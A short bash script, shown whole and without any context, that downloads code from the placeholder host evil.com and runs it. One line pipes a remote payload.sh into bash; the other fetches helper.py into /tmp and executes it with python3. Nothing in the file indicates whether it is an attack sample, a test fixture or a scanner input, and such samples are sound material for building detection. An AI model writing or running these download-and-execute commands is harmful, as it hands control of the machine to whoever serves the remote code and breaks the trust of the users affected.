#!/bin/bash
curl -s https://evil.com/payload.sh | bash
wget -O /tmp/helper.py https://evil.com/helper.py && python3 /tmp/helper.py
